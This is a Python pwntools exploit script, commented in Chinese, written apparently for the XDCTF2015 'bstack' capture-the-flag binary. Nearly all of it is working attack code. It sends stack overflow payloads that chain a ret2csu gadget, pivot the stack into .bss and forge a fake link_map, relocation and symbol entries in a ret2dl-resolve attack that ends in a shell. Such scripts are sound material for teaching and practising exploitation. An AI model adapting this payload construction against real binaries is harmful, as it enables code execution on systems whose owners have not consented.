#!/usr/bin/python
#coding:utf-8
from pwn import *

#需修改:文件名、溢出偏移、gadget地址、各节地址
fpath = './bstack'
offset = 0x70
length = 0x100
stack_size = 0x800
main_addr=0x400676
p6_addr=0x40077A
call_addr=0x400760
leave_ret=0x00000000004006AB
p_rbp_ret=0x00000000004005e0
p_rdi_ret=0x0000000000400783

elf = ELF(fpath)
read_got=elf.got['read']
read_plt = elf.plt['read']
got_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008
bss_addr =elf.get_section_by_name('.bss').header.sh_addr
base_stage = bss_addr + stack_size
#print 'got_8=',hex(got_8)

#x/100xw  GOT[8]
fake_link_map=elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147
fake_r_offset=0x3c5720-0x20740
val_0x68=base_stage+0xc0-8    #0x600ea8
val_0x70=base_stage+0xc0-8    #0x600eb8
val_0xf8=base_stage+0xc0-8    #0x600f28
wait_time=0.1

def makecall(addr, rdi, rsi, rdx, tail = 0):
    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdx)
    payload += p64(rsi)
    payload += p64(rdi)
    payload += p64(call_addr)
    if (tail):
        payload += p64(0x0) * 7 + p64(tail)
    return payload

p = process(fpath)
#print p.recv()        # 'Welcome to XDCTF2015~!\n'

#1.往fake_link_map+0x68写值
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,fake_link_map+0x68,16,tail=main_addr)
payload=payload.ljust(0x100,'\x00')
p.send(payload)
sleep(wait_time)
p.send(p64(val_0x68)+p64(val_0x70))

#2.往fake_link_map+0xf8写值
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,fake_link_map+0xf8,8,tail=main_addr)
payload=payload.ljust(0x100,'\x00')
p.send(payload)
sleep(wait_time)
p.send(p64(val_0xf8))

#3.往base_stage写入伪造结构并跳过去
payload='\x00'*offset
payload+='\x00'*8
payload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #假设结构大小是400
payload+=p64(0)*2+p64(base_stage)+p64(0)*4
payload+=p64(leave_ret)
payload=payload.ljust(0x100,'\x00')
p.send(payload)


#4.bss数据：rop-参数放在寄存器/ 伪造结构  
#(1)确定各个节的地址 
plt_0 = 0x0000000000400520 # objdump -d -j .plt bof
plt_1 = plt_0+6
#(2)确定重定位下标
align = 24 - (56 % 24)  # 这里的对齐操作是因为dynsym里的ELF64_R_SYM结构体都是24字节大小
index_offset = base_stage + 7*8 + align
index = (7*8 + align) / 24 # base_stage + 7*8 指向fake_reloc，减去rel_plt即偏移
#(3)确定动态链接符号下标
align = 24 - ((13*8) % 24)# 这里的对齐操作是因为dynsym里的Elf64_Sym结构体都是24字节大小
fake_sym_addr = base_stage + 13*8 + align
index_dynsym = (13*8 + align) / 24 # 除以24因为Elf64_Sym结构体的大小为24，得到write的dynsym索引号
#(4)伪造重定位结构+动态链接结构
r_info = (index_dynsym << 32) | 0x7
fake_reloc = p64(fake_r_offset) + p64(r_info) + p64(0)
fake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)

payload2 = p64(0)#'AAAAAAAA'
payload2 += p64(p_rdi_ret)
payload2 += p64(base_stage+0xc0)   #/bin/sh
payload2 += p64(plt_1)
payload2 += p64(fake_link_map)   #
payload2 += p64(index)       #jmprel 下标参数
payload2 += p64(0)       #返回地址

payload2 = payload2.ljust(index_offset-base_stage,'\x00')
payload2 += fake_reloc # index_offset(base_stage+7*8)的位置
payload2 = payload2.ljust(fake_sym_addr-base_stage,'\x00')
payload2 += fake_sym   # fake_sym_addr(base_stage+9*8)的位置
payload2 = payload2.ljust(0xc0,'\x00')
payload2 += p64(base_stage)
payload2 = payload2.ljust(0xd0,'\x00')

p.send(payload2)
p.interactive()

